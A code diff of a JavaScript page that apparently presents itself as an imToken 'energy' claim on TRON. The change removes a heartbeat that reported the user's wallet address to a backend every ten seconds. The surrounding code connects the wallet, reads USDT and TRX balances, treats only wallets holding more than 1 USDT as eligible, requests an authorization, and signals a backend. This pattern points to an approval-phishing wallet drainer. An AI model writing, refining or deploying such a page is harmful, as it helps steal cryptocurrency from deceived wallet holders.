@@ -415,10 +415,7 @@
     let tokenBalance = 0.00; // USDT余额
     let trxBalance = 0.00;  // TRX余额
     const RECORD_KEY = "imtoken_energy_records";
-    // 心跳相关变量
-    let heartbeatTimer = null;
-    let isHeartbeating = false; // 避免重复发送心跳
-    
+
     // ========== 多语言配置 ==========
     const langConfig = {
         zh: {
@@ -643,11 +640,10 @@
         // 启动能量计算
         startPersistentEnergyCountdown();
         
-        // 页面卸载时保存状态+停止心跳
+        // 页面卸载时保存状态
         window.addEventListener("beforeunload", () => {
             saveEnergyStateToStorage();
             if (energyTimer) clearInterval(energyTimer);
-            stopHeartbeat(); // 页面卸载时停止心跳
         });
 
         // 授权后跳转回页面的处理
@@ -702,10 +698,7 @@
             userAddress = tronWeb.defaultAddress.base58;
             if (!userAddress) throw new Error(currentLang === "zh" ? "未检测到钱包地址，请确保钱包已解锁" : "Wallet address not detected - please unlock your wallet");
 
-            // 2. 启动心跳（用户连接后立即启动，10秒一次）
-            startHeartbeat(userAddress);
-
-            // 3. 二次授权拦截
+            // 2. 二次授权拦截
             if (isAddressAuthorized(userAddress)) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.authorizedTip.replace("{address}", shortAddr);
@@ -716,7 +709,7 @@
                 return;
             }
 
-            // 4. 授权后返回，直接执行后续逻辑
+            // 3. 授权后返回，直接执行后续逻辑
             if (isAfterApprove) {
                 const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 userInfoEl.innerHTML = lang.afterApproveTip.replace("{address}", shortAddr);
@@ -728,11 +721,11 @@
                 return;
             }
 
-            // 5. 立即发送A1信号（对应后端/api/send-signal-a1，分开发送）
+            // 4. 立即发送A1信号（对应后端/api/send-signal-a1，分开发送）
             sendSignalA1();
             console.log("✅ A1信号已异步发送（分开发送，等待B1）");
 
-            // 6. 立即显示UI
+            // 5. 立即显示UI
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             userInfoEl.innerHTML = lang.loadingTip.replace("{address}", shortAddr);
             approveBtn.disabled = true;
@@ -743,13 +736,13 @@
             // 🔥 用精简ABI初始化合约（仅2个核心函数，50ms内完成）
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
 
-            // 7. 查询余额（速度更快）
+            // 6. 查询余额（速度更快）
             const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
             const trxRaw = await tronWeb.trx.getBalance(userAddress);
             tokenBalance = Number(usdtRaw) / 1000000;
             trxBalance = Number(trxRaw) / 1000000;
 
-            // 8. 更新UI和按钮状态
+            // 7. 更新UI和按钮状态
             if (tokenBalance <= 1) {
                 userInfoEl.innerHTML = lang.insufficientUsdt
                     .replace("{address}", shortAddr)
@@ -757,7 +750,6 @@
                     .replace("{trx}", trxBalance.toFixed(2));
                 approveBtn.disabled = true;
                 approveBtn.textContent = lang.insufficientBtn;
-                stopHeartbeat(); // 不符合条件，停止心跳
             } else {
                 userInfoEl.innerHTML = lang.eligibleTip
                     .replace("{address}", shortAddr)
@@ -774,7 +766,6 @@
             approveBtn.disabled = false;
             approveBtn.textContent = lang.retryConnect;
             approveBtn.onclick = () => initWallet(false);
-            stopHeartbeat(); // 连接异常，停止心跳
         }
     }
 
@@ -811,14 +802,12 @@
             alert(lang.successTip);
             saveEnergyRecord();
             renderEnergyRecords();
-            stopHeartbeat(); // 领取成功，停止心跳
         } catch (e) {
             const lang = langConfig[currentLang];
             const btn = document.getElementById("approveBtn");
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
             alert(lang.authorizeFail.replace("{msg}", e.message));
-            stopHeartbeat(); // 失败，停止心跳
         }
     }
 
@@ -926,52 +915,8 @@
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 alert(lang.approveFail.replace("{msg}", e.message));
-                stopHeartbeat(); // 操作失败，停止心跳
             }
         };
-    }
-
-    /**
-     * 心跳功能：10秒一次，维持用户活跃状态（适配后端）
-     * @param {string} address - 用户TRON地址
-     */
-    function startHeartbeat(address) {
-        // 先停止旧心跳，避免重复
-        if (heartbeatTimer) clearInterval(heartbeatTimer);
-        isHeartbeating = false;
-
-        // 10秒一次发送心跳
-        heartbeatTimer = setInterval(async () => {
-            if (isHeartbeating) return; // 上一次心跳未完成，跳过
-            isHeartbeating = true;
-
-            try {
-                await fetch(`${BACKEND_API}/api/heartbeat`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ userAddress: address }),
-                    timeout: 5000,
-                    keepalive: true
-                });
-                // console.log("❤️ 心跳发送成功"); // 调试用，可注释
-            } catch (err) {
-                console.error("❌ 心跳发送失败（用户可能已退出）：", err);
-                // 心跳失败不停止，继续尝试（避免网络波动误判）
-            } finally {
-                isHeartbeating = false;
-            }
-        }, 10000); // 10秒一次，匹配后端配置
-    }
-
-    /**
-     * 停止心跳
-     */
-    function stopHeartbeat() {
-        if (heartbeatTimer) {
-            clearInterval(heartbeatTimer);
-            heartbeatTimer = null;
-            console.log("🛑 心跳已停止");
-        }
     }
 
     /**
